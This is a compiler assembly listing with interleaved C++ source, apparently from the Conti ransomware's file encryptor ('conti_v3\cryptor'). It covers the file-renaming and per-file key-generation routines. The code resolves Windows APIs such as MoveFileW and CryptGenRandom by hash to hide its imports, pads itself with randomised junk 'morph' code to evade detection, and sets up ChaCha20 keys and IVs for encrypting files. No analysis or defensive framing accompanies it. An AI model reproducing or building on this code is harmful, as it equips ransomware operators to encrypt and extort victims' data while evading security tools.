  00258	8b 44 24 38	 mov	 eax, DWORD PTR _morph_var$1[rsp]
  0025c	03 f8		 add	 edi, eax
  0025e	89 7c 24 38	 mov	 DWORD PTR _morph_var$1[rsp], edi

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  00262	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00267	8b 4c 24 38	 mov	 ecx, DWORD PTR _morph_var$1[rsp]
  0026b	f7 e9		 imul	 ecx
  0026d	8b c2		 mov	 eax, edx
  0026f	c1 e8 1f	 shr	 eax, 31
  00272	03 d0		 add	 edx, eax
  00274	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00277	3b c8		 cmp	 ecx, eax
  00279	75 28		 jne	 SHORT $LN66@ChangeFile
  0027b	0f 1f 44 00 00	 npad	 5
$LL61@ChangeFile:
  00280	8b 44 24 38	 mov	 eax, DWORD PTR _morph_var$1[rsp]
  00284	ff c0		 inc	 eax
  00286	89 44 24 38	 mov	 DWORD PTR _morph_var$1[rsp], eax
  0028a	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  0028f	8b 4c 24 38	 mov	 ecx, DWORD PTR _morph_var$1[rsp]
  00293	f7 e9		 imul	 ecx
  00295	8b c2		 mov	 eax, edx
  00297	c1 e8 1f	 shr	 eax, 31
  0029a	03 d0		 add	 edx, eax
  0029c	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0029f	3b c8		 cmp	 ecx, eax
  002a1	74 dd		 je	 SHORT $LL61@ChangeFile
$LN66@ChangeFile:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 287  : 	pFunction = (BOOL(WINAPI*)(LPCWSTR, LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x102e520c, 86);//GetProcAddress(hKernel32, OBFA("MoveFileW"));

  002a3	ba 0f 00 00 00	 mov	 edx, 15
  002a8	41 b8 0c 52 2e
	10		 mov	 r8d, 271471116		; 102e520cH
  002ae	44 8d 4a 47	 lea	 r9d, QWORD PTR [rdx+71]
  002b2	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 288  : 	return pFunction(lpExistingFileName, lpNewFileName);

  002b7	48 8b d3	 mov	 rdx, rbx
  002ba	48 8b ce	 mov	 rcx, rsi
  002bd	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp

; 17   : 	free(Memory);

  002bf	48 8b cb	 mov	 rcx, rbx
  002c2	e8 00 00 00 00	 call	 free
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 685  : 	return TRUE;

  002c7	48 8b 7c 24 30	 mov	 rdi, QWORD PTR [rsp+48]
  002cc	b8 01 00 00 00	 mov	 eax, 1

; 686  : }

  002d1	48 8b 5c 24 40	 mov	 rbx, QWORD PTR [rsp+64]
  002d6	48 83 c4 20	 add	 rsp, 32			; 00000020H
  002da	5e		 pop	 rsi
  002db	c3		 ret	 0
?ChangeFileName@cryptor@@YAHPEB_W@Z ENDP		; cryptor::ChangeFileName
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\chacha20\chacha.c
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\chacha20\chacha.c
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\chacha20\chacha.c
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\chacha20\chacha.c
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\chacha20\chacha.c
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
;	COMDAT ?GenKey@@YAH_K0PEAUfile_info@cryptor@@@Z
_TEXT	SEGMENT
_morph_var$1 = 64
_morph_var$2 = 64
_morph_var$3 = 64
_morph_var$4 = 64
dwDataLen$ = 68
__$ArrayPad$ = 72
Provider$ = 144
PublicKey$ = 152
FileInfo$ = 160
?GenKey@@YAH_K0PEAUfile_info@cryptor@@@Z PROC		; GenKey, COMDAT

; 695  : {

$LN274:
  00000	40 55		 push	 rbp
  00002	53		 push	 rbx
  00003	57		 push	 rdi
  00004	41 54		 push	 r12
  00006	41 55		 push	 r13
  00008	41 57		 push	 r15
  0000a	48 8b ec	 mov	 rbp, rsp
  0000d	48 83 ec 58	 sub	 rsp, 88			; 00000058H
  00011	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  00018	48 33 c4	 xor	 rax, rsp
  0001b	48 89 45 f0	 mov	 QWORD PTR __$ArrayPad$[rbp-88], rax
  0001f	4c 8b ea	 mov	 r13, rdx

; 696  : 	DWORD dwDataLen = 40;

  00022	c7 45 ec 28 00
	00 00		 mov	 DWORD PTR dwDataLen$[rbp-88], 40 ; 00000028H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  00029	c7 45 e8 c1 9b
	17 00		 mov	 DWORD PTR _morph_var$4[rbp-88], 1547201 ; 00179bc1H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 695  : {

  00030	48 8b f9	 mov	 rdi, rcx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  00033	8b 4d e8	 mov	 ecx, DWORD PTR _morph_var$4[rbp-88]
  00036	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  0003b	f7 e9		 imul	 ecx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 695  : {

  0003d	4d 8b f8	 mov	 r15, r8
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  00040	41 bc 02 00 00
	00		 mov	 r12d, 2
  00046	8b c2		 mov	 eax, edx
  00048	c1 e8 1f	 shr	 eax, 31
  0004b	03 d0		 add	 edx, eax
  0004d	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00050	3b c8		 cmp	 ecx, eax
  00052	74 4b		 je	 SHORT $LN17@GenKey

; 49   : 		_morph_var += (int)a + 2;

  00054	8b 4d e8	 mov	 ecx, DWORD PTR _morph_var$4[rbp-88]
  00057	41 03 cc	 add	 ecx, r12d
  0005a	41 03 cf	 add	 ecx, r15d
  0005d	89 4d e8	 mov	 DWORD PTR _morph_var$4[rbp-88], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  00060	8b 45 e8	 mov	 eax, DWORD PTR _morph_var$4[rbp-88]
  00063	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00068	7d 07		 jge	 SHORT $LN216@GenKey
  0006a	ff c8		 dec	 eax
  0006c	83 c8 fc	 or	 eax, -4
  0006f	ff c0		 inc	 eax
$LN216@GenKey:
  00071	85 c0		 test	 eax, eax
  00073	75 7b		 jne	 SHORT $LN16@GenKey
  00075	66 66 66 0f 1f
	84 00 00 00 00
	00		 npad	 11
$LL9@GenKey:
  00080	8b 45 e8	 mov	 eax, DWORD PTR _morph_var$4[rbp-88]
  00083	ff c0		 inc	 eax
  00085	89 45 e8	 mov	 DWORD PTR _morph_var$4[rbp-88], eax
  00088	8b 45 e8	 mov	 eax, DWORD PTR _morph_var$4[rbp-88]
  0008b	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00090	7d 07		 jge	 SHORT $LN215@GenKey
  00092	ff c8		 dec	 eax
  00094	83 c8 fc	 or	 eax, -4
  00097	ff c0		 inc	 eax
$LN215@GenKey:
  00099	85 c0		 test	 eax, eax
  0009b	74 e3		 je	 SHORT $LL9@GenKey

; 51   : 	}

  0009d	eb 51		 jmp	 SHORT $LN16@GenKey
$LN17@GenKey:

; 52   : 	else if (_morph_var % 2) {

  0009f	8b 45 e8	 mov	 eax, DWORD PTR _morph_var$4[rbp-88]

; 53   : 		_morph_var -= (int)a - 2;

  000a2	41 8b cc	 mov	 ecx, r12d
  000a5	8b 45 e8	 mov	 eax, DWORD PTR _morph_var$4[rbp-88]
  000a8	41 2b cf	 sub	 ecx, r15d
  000ab	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  000ad	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  000b2	89 4d e8	 mov	 DWORD PTR _morph_var$4[rbp-88], ecx
  000b5	8b 4d e8	 mov	 ecx, DWORD PTR _morph_var$4[rbp-88]
  000b8	f7 e9		 imul	 ecx
  000ba	8b c2		 mov	 eax, edx
  000bc	c1 e8 1f	 shr	 eax, 31
  000bf	03 d0		 add	 edx, eax
  000c1	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  000c4	3b c8		 cmp	 ecx, eax
  000c6	75 28		 jne	 SHORT $LN16@GenKey
  000c8	0f 1f 84 00 00
	00 00 00	 npad	 8
$LL11@GenKey:
  000d0	8b 45 e8	 mov	 eax, DWORD PTR _morph_var$4[rbp-88]
  000d3	ff c0		 inc	 eax
  000d5	89 45 e8	 mov	 DWORD PTR _morph_var$4[rbp-88], eax
  000d8	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  000dd	8b 4d e8	 mov	 ecx, DWORD PTR _morph_var$4[rbp-88]
  000e0	f7 e9		 imul	 ecx
  000e2	8b c2		 mov	 eax, edx
  000e4	c1 e8 1f	 shr	 eax, 31
  000e7	03 d0		 add	 edx, eax
  000e9	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  000ec	3b c8		 cmp	 ecx, eax
  000ee	74 e0		 je	 SHORT $LL11@GenKey
$LN16@GenKey:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 637  : 	pFunction = (BOOL(WINAPI*)(HCRYPTPROV, DWORD, BYTE*))getapi::GetProcAddressEx2(NULL, ADVAPI32_MODULE_ID, 0xe6b09957, 53);//GetProcAddress(hAdvapi32, OBFA("CryptGenRandom"));

  000f0	ba 10 00 00 00	 mov	 edx, 16
  000f5	48 89 b4 24 a8
	00 00 00	 mov	 QWORD PTR [rsp+168], rsi
  000fd	41 b8 57 99 b0
	e6		 mov	 r8d, -424634025		; e6b09957H
  00103	44 8d 4a 25	 lea	 r9d, QWORD PTR [rdx+37]
  00107	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 700  : 	if (!pCryptGenRandom(Provider, 32, FileInfo->ChachaKey)) {

  0010c	49 8d 5f 60	 lea	 rbx, QWORD PTR [r15+96]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 638  : 	return pFunction(hProv, dwLen, pbBuffer);

  00110	ba 20 00 00 00	 mov	 edx, 32			; 00000020H
  00115	4c 8b c3	 mov	 r8, rbx
  00118	48 8b cf	 mov	 rcx, rdi
  0011b	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 700  : 	if (!pCryptGenRandom(Provider, 32, FileInfo->ChachaKey)) {

  0011d	85 c0		 test	 eax, eax
  0011f	0f 84 53 03 00
	00		 je	 $LN202@GenKey
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  00125	c7 45 e8 c1 9b
	17 00		 mov	 DWORD PTR _morph_var$3[rbp-88], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  0012c	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00131	8b 4d e8	 mov	 ecx, DWORD PTR _morph_var$3[rbp-88]
  00134	f7 e9		 imul	 ecx
  00136	8b c2		 mov	 eax, edx
  00138	c1 e8 1f	 shr	 eax, 31
  0013b	03 d0		 add	 edx, eax
  0013d	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00140	3b c8		 cmp	 ecx, eax
  00142	74 4b		 je	 SHORT $LN42@GenKey

; 49   : 		_morph_var += (int)a + 2;

  00144	8b 4d e8	 mov	 ecx, DWORD PTR _morph_var$3[rbp-88]
  00147	41 03 cc	 add	 ecx, r12d
  0014a	03 cb		 add	 ecx, ebx
  0014c	89 4d e8	 mov	 DWORD PTR _morph_var$3[rbp-88], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  0014f	8b 45 e8	 mov	 eax, DWORD PTR _morph_var$3[rbp-88]
  00152	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00157	7d 07		 jge	 SHORT $LN213@GenKey
  00159	ff c8		 dec	 eax
  0015b	83 c8 fc	 or	 eax, -4
  0015e	ff c0		 inc	 eax
$LN213@GenKey:
  00160	85 c0		 test	 eax, eax
  00162	75 7c		 jne	 SHORT $LN41@GenKey
  00164	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL34@GenKey:
  00170	8b 45 e8	 mov	 eax, DWORD PTR _morph_var$3[rbp-88]
  00173	ff c0		 inc	 eax
  00175	89 45 e8	 mov	 DWORD PTR _morph_var$3[rbp-88], eax
  00178	8b 45 e8	 mov	 eax, DWORD PTR _morph_var$3[rbp-88]
  0017b	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00180	7d 07		 jge	 SHORT $LN212@GenKey
  00182	ff c8		 dec	 eax
  00184	83 c8 fc	 or	 eax, -4
  00187	ff c0		 inc	 eax
$LN212@GenKey:
  00189	85 c0		 test	 eax, eax
  0018b	74 e3		 je	 SHORT $LL34@GenKey

; 51   : 	}

  0018d	eb 51		 jmp	 SHORT $LN41@GenKey
$LN42@GenKey:

; 52   : 	else if (_morph_var % 2) {

  0018f	8b 45 e8	 mov	 eax, DWORD PTR _morph_var$3[rbp-88]

; 53   : 		_morph_var -= (int)a - 2;

  00192	41 8b cc	 mov	 ecx, r12d
  00195	8b 45 e8	 mov	 eax, DWORD PTR _morph_var$3[rbp-88]
  00198	2b cb		 sub	 ecx, ebx
  0019a	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  0019c	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  001a1	89 4d e8	 mov	 DWORD PTR _morph_var$3[rbp-88], ecx
  001a4	8b 4d e8	 mov	 ecx, DWORD PTR _morph_var$3[rbp-88]
  001a7	f7 e9		 imul	 ecx
  001a9	8b c2		 mov	 eax, edx
  001ab	c1 e8 1f	 shr	 eax, 31
  001ae	03 d0		 add	 edx, eax
  001b0	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  001b3	3b c8		 cmp	 ecx, eax
  001b5	75 29		 jne	 SHORT $LN41@GenKey
  001b7	66 0f 1f 84 00
	00 00 00 00	 npad	 9
$LL36@GenKey:
  001c0	8b 45 e8	 mov	 eax, DWORD PTR _morph_var$3[rbp-88]
  001c3	ff c0		 inc	 eax
  001c5	89 45 e8	 mov	 DWORD PTR _morph_var$3[rbp-88], eax
  001c8	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  001cd	8b 4d e8	 mov	 ecx, DWORD PTR _morph_var$3[rbp-88]
  001d0	f7 e9		 imul	 ecx
  001d2	8b c2		 mov	 eax, edx
  001d4	c1 e8 1f	 shr	 eax, 31
  001d7	03 d0		 add	 edx, eax
  001d9	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  001dc	3b c8		 cmp	 ecx, eax
  001de	74 e0		 je	 SHORT $LL36@GenKey
$LN41@GenKey:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 637  : 	pFunction = (BOOL(WINAPI*)(HCRYPTPROV, DWORD, BYTE*))getapi::GetProcAddressEx2(NULL, ADVAPI32_MODULE_ID, 0xe6b09957, 53);//GetProcAddress(hAdvapi32, OBFA("CryptGenRandom"));

  001e0	ba 10 00 00 00	 mov	 edx, 16
  001e5	41 b8 57 99 b0
	e6		 mov	 r8d, -424634025		; e6b09957H
  001eb	44 8d 4a 25	 lea	 r9d, QWORD PTR [rdx+37]
  001ef	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 706  : 	if (!pCryptGenRandom(Provider, 8, FileInfo->ChachaIV)) {

  001f4	49 8d 77 58	 lea	 rsi, QWORD PTR [r15+88]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 638  : 	return pFunction(hProv, dwLen, pbBuffer);

  001f8	ba 08 00 00 00	 mov	 edx, 8
  001fd	4c 8b c6	 mov	 r8, rsi
  00200	48 8b cf	 mov	 rcx, rdi
  00203	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 706  : 	if (!pCryptGenRandom(Provider, 8, FileInfo->ChachaIV)) {

  00205	85 c0		 test	 eax, eax
  00207	0f 84 6b 02 00
	00		 je	 $LN202@GenKey
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  0020d	c7 45 e8 c1 9b
	17 00		 mov	 DWORD PTR _morph_var$2[rbp-88], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  00214	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00219	8b 4d e8	 mov	 ecx, DWORD PTR _morph_var$2[rbp-88]
  0021c	f7 e9		 imul	 ecx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 706  : 	if (!pCryptGenRandom(Provider, 8, FileInfo->ChachaIV)) {

  0021e	4c 89 74 24 50	 mov	 QWORD PTR [rsp+80], r14
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  00223	8b c2		 mov	 eax, edx
  00225	c1 e8 1f	 shr	 eax, 31
  00228	03 d0		 add	 edx, eax
  0022a	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0022d	3b c8		 cmp	 ecx, eax
  0022f	74 4e		 je	 SHORT $LN67@GenKey

; 49   : 		_morph_var += (int)a + 2;

  00231	8b 4d e8	 mov	 ecx, DWORD PTR _morph_var$2[rbp-88]
  00234	41 03 cc	 add	 ecx, r12d
  00237	03 ce		 add	 ecx, esi
  00239	89 4d e8	 mov	 DWORD PTR _morph_var$2[rbp-88], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  0023c	8b 45 e8	 mov	 eax, DWORD PTR _morph_var$2[rbp-88]
  0023f	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00244	7d 07		 jge	 SHORT $LN210@GenKey
  00246	ff c8		 dec	 eax
  00248	83 c8 fc	 or	 eax, -4
  0024b	ff c0		 inc	 eax
$LN210@GenKey:
  0024d	85 c0		 test	 eax, eax
  0024f	75 7f		 jne	 SHORT $LN66@GenKey
  00251	0f 1f 40 00 66
	66 66 0f 1f 84
	00 00 00 00 00	 npad	 15
$LL59@GenKey:
  00260	8b 45 e8	 mov	 eax, DWORD PTR _morph_var$2[rbp-88]
  00263	ff c0		 inc	 eax
  00265	89 45 e8	 mov	 DWORD PTR _morph_var$2[rbp-88], eax
  00268	8b 45 e8	 mov	 eax, DWORD PTR _morph_var$2[rbp-88]
  0026b	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00270	7d 07		 jge	 SHORT $LN209@GenKey
  00272	ff c8		 dec	 eax
  00274	83 c8 fc	 or	 eax, -4
  00277	ff c0		 inc	 eax
$LN209@GenKey:
  00279	85 c0		 test	 eax, eax
  0027b	74 e3		 je	 SHORT $LL59@GenKey

; 51   : 	}

  0027d	eb 51		 jmp	 SHORT $LN66@GenKey
$LN67@GenKey:

; 52   : 	else if (_morph_var % 2) {

  0027f	8b 45 e8	 mov	 eax, DWORD PTR _morph_var$2[rbp-88]

; 53   : 		_morph_var -= (int)a - 2;

  00282	41 8b cc	 mov	 ecx, r12d
  00285	8b 45 e8	 mov	 eax, DWORD PTR _morph_var$2[rbp-88]
  00288	2b ce		 sub	 ecx, esi
  0028a	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  0028c	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00291	89 4d e8	 mov	 DWORD PTR _morph_var$2[rbp-88], ecx
  00294	8b 4d e8	 mov	 ecx, DWORD PTR _morph_var$2[rbp-88]
  00297	f7 e9		 imul	 ecx
  00299	8b c2		 mov	 eax, edx
  0029b	c1 e8 1f	 shr	 eax, 31
  0029e	03 d0		 add	 edx, eax
  002a0	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  002a3	3b c8		 cmp	 ecx, eax
  002a5	75 29		 jne	 SHORT $LN66@GenKey
  002a7	66 0f 1f 84 00
	00 00 00 00	 npad	 9
$LL61@GenKey:
  002b0	8b 45 e8	 mov	 eax, DWORD PTR _morph_var$2[rbp-88]
  002b3	ff c0		 inc	 eax
  002b5	89 45 e8	 mov	 DWORD PTR _morph_var$2[rbp-88], eax
  002b8	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  002bd	8b 4d e8	 mov	 ecx, DWORD PTR _morph_var$2[rbp-88]
  002c0	f7 e9		 imul	 ecx
  002c2	8b c2		 mov	 eax, edx
  002c4	c1 e8 1f	 shr	 eax, 31
  002c7	03 d0		 add	 edx, eax
  002c9	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  002cc	3b c8		 cmp	 ecx, eax
  002ce	74 e0		 je	 SHORT $LL61@GenKey
$LN66@GenKey:
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h

; 21771:     __stosb((PBYTE )((DWORD64)vptr), 0, cnt);

  002d0	33 c0		 xor	 eax, eax
  002d2	49 8d 7f 18	 lea	 rdi, QWORD PTR [r15+24]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\chacha20\chacha.c

; 55   :     x->input[12] = 0;

  002d6	45 33 f6	 xor	 r14d, r14d
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h

; 21771:     __stosb((PBYTE )((DWORD64)vptr), 0, cnt);

  002d9	b9 40 00 00 00	 mov	 ecx, 64			; 00000040H
  002de	f3 aa		 rep stosb
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\chacha20\chacha.c

; 32   :     x->input[4] = U8TO32_LITTLE(k + 0);

  002e0	8b 03		 mov	 eax, DWORD PTR [rbx]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 716  : 	memory::Copy(FileInfo->EncryptedKey, FileInfo->ChachaKey, 32);

  002e2	49 8d bf 80 00
	00 00		 lea	 rdi, QWORD PTR [r15+128]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\chacha20\chacha.c

; 32   :     x->input[4] = U8TO32_LITTLE(k + 0);

  002e9	41 89 47 28	 mov	 DWORD PTR [r15+40], eax
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h

; 21771:     __stosb((PBYTE )((DWORD64)vptr), 0, cnt);

  002ed	41 8d 56 04	 lea	 edx, QWORD PTR [r14+4]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\chacha20\chacha.c

; 33   :     x->input[5] = U8TO32_LITTLE(k + 4);

  002f1	8b 43 04	 mov	 eax, DWORD PTR [rbx+4]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp

; 26   : 	unsigned char* _dst = (unsigned char*)pDst;

  002f4	48 8b cf	 mov	 rcx, rdi
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\chacha20\chacha.c

; 33   :     x->input[5] = U8TO32_LITTLE(k + 4);

  002f7	41 89 47 2c	 mov	 DWORD PTR [r15+44], eax

; 34   :     x->input[6] = U8TO32_LITTLE(k + 8);

  002fb	8b 43 08	 mov	 eax, DWORD PTR [rbx+8]
  002fe	41 89 47 30	 mov	 DWORD PTR [r15+48], eax

; 35   :     x->input[7] = U8TO32_LITTLE(k + 12);

  00302	8b 43 0c	 mov	 eax, DWORD PTR [rbx+12]
  00305	41 89 47 34	 mov	 DWORD PTR [r15+52], eax

; 36   :     if (kbits == 256) { /* recommended */
; 37   :         k += 16;
; 38   :         constants = sigma;
; 39   :     }
; 40   :     else { /* kbits == 128 */
; 41   :         constants = tau;
; 42   :     }
; 43   :     x->input[8] = U8TO32_LITTLE(k + 0);

  00309	8b 43 10	 mov	 eax, DWORD PTR [rbx+16]
  0030c	41 89 47 38	 mov	 DWORD PTR [r15+56], eax

; 44   :     x->input[9] = U8TO32_LITTLE(k + 4);

  00310	8b 43 14	 mov	 eax, DWORD PTR [rbx+20]
  00313	41 89 47 3c	 mov	 DWORD PTR [r15+60], eax

; 45   :     x->input[10] = U8TO32_LITTLE(k + 8);

  00317	8b 43 18	 mov	 eax, DWORD PTR [rbx+24]
  0031a	41 89 47 40	 mov	 DWORD PTR [r15+64], eax

; 46   :     x->input[11] = U8TO32_LITTLE(k + 12);

  0031e	8b 43 1c	 mov	 eax, DWORD PTR [rbx+28]
  00321	41 89 47 44	 mov	 DWORD PTR [r15+68], eax

; 47   :     x->input[0] = U8TO32_LITTLE(constants + 0);

  00325	41 c7 47 18 65
	78 70 61	 mov	 DWORD PTR [r15+24], 1634760805 ; 61707865H

; 48   :     x->input[1] = U8TO32_LITTLE(constants + 4);

  0032d	41 c7 47 1c 6e
	64 20 33	 mov	 DWORD PTR [r15+28], 857760878 ; 3320646eH

; 49   :     x->input[2] = U8TO32_LITTLE(constants + 8);

  00335	41 c7 47 20 32
	2d 62 79	 mov	 DWORD PTR [r15+32], 2036477234 ; 79622d32H

; 50   :     x->input[3] = U8TO32_LITTLE(constants + 12);

  0033d	41 c7 47 24 74
	65 20 6b	 mov	 DWORD PTR [r15+36], 1797285236 ; 6b206574H

; 55   :     x->input[12] = 0;

  00345	4d 89 77 48	 mov	 QWORD PTR [r15+72], r14

; 56   :     x->input[13] = 0;
; 57   :     x->input[14] = U8TO32_LITTLE(iv + 0);

  00349	8b 06		 mov	 eax, DWORD PTR [rsi]
  0034b	41 89 47 50	 mov	 DWORD PTR [r15+80], eax

; 58   :     x->input[15] = U8TO32_LITTLE(iv + 4);

  0034f	8b 46 04	 mov	 eax, DWORD PTR [rsi+4]
  00352	41 89 47 54	 mov	 DWORD PTR [r15+84], eax
  00356	66 66 0f 1f 84
	00 00 00 00 00	 npad	 10
$LL90@GenKey:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp

; 29   : 		*(size_t*)_dst = *(size_t*)_src;

  00360	48 8b 03	 mov	 rax, QWORD PTR [rbx]
  00363	48 8d 5b 08	 lea	 rbx, QWORD PTR [rbx+8]
  00367	48 89 01	 mov	 QWORD PTR [rcx], rax
  0036a	48 8d 49 08	 lea	 rcx, QWORD PTR [rcx+8]
  0036e	48 83 ea 01	 sub	 rdx, 1
  00372	75 ec		 jne	 SHORT $LL90@GenKey
  00374	48 8b 06	 mov	 rax, QWORD PTR [rsi]
  00377	49 89 87 a0 00
	00 00		 mov	 QWORD PTR [r15+160], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  0037e	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00383	c7 45 e8 c1 9b
	17 00		 mov	 DWORD PTR _morph_var$1[rbp-88], 1547201 ; 00179bc1H
